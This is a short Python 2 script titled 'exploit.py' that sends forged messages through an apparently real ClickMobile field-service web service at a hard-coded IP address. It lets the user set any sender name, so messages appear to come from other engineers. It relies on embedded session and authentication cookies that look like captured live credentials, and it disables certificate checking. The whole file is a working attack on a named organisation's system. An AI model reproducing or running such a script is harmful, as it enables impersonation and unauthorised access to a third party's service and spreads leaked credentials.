import requests
import sys


banner = """
Uso: exploit.py emisor destinatario "mensaje"
"""

if len(sys.argv) < 4:
    print banner
    exit(0)

emisor = sys.argv[1] # UNEfieldste4, UNEfieldste3
destinatario = sys.argv[2] # UNEfieldste8
mensaje = sys.argv[3]

headers = {
    "Accept": "*/*",
    "X-Requested-With": "XMLHttpRequest",
    "Content-Type": "application/json; charset=utf-8",
    "Referer": "https://200.13.250.144/ClickMobileWEB/default.aspx?Culture=es",
    "Accept-Language": "es-CO",
    "Accept-Encoding": "gzip, deflate",
    "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "DNT": "1",
    "Connection": "Keep-Alive",
    "Cache-Control": "no-cache",
    "Cookie": "ASP.NET_SessionId=niujilujdidaptr21ftiyfzs; .ASPXAUTH=7522973BBE8AB91601244BAB776F912AC57BF685F6C3103317576D4E5967B812AA23DD771376A9D8BA5AFC70ADAEE8C1E0E67C7B69CA06C79216CBEDB9027178E6E27A038337D65062A415FC477CBC94C0DD956F30F5AC5EDD0FBB597A6915FE8033727F98E94EF3FEC33D8202ED6ED07B056C1B6F3CC118A90D695EEE20472BA4A9C2D507C34B3FEE6874D9B9CCBD52",
}

data = """
{"iEngineerKey":789630979,"strUserName":"%s","iDeviceID":6815154,"iSectorId":1,"strPGDeviceId":"","iDeviceRegistrationInfo":-1,"strBrowserType":"PCBrowser","arrRequests":[{"__type":"W6CMWebServicesLib.W6CMRequest","Body":"<SXPMobileSendMessage Revision=\\"7.5.0\\"><MobileType>WEB</MobileType><From>%s</From><To><U>%s</U></To><B>%s</B><Type>ENG2ENG</Type><IMP>1</IMP><MessageClientKey>b5716834-6576-deda-da0f-1bfe6c0dc73e</MessageClientKey><U>%s</U><DMN>EMPTELCO</DMN><DID>6815154</DID></SXPMobileSendMessage>\\r\\n","ClientRequestKey":263}],"bRunningInBackground":false}
""" % (emisor, emisor.lower(), destinatario, mensaje, emisor)

res = requests.post("https://200.13.250.144/ClickMobileWEB/W6CMSyncService.asmx/PushRequests?145926029753893265.34698297002", headers=headers, data=data, verify=False, proxies=None)
print res.text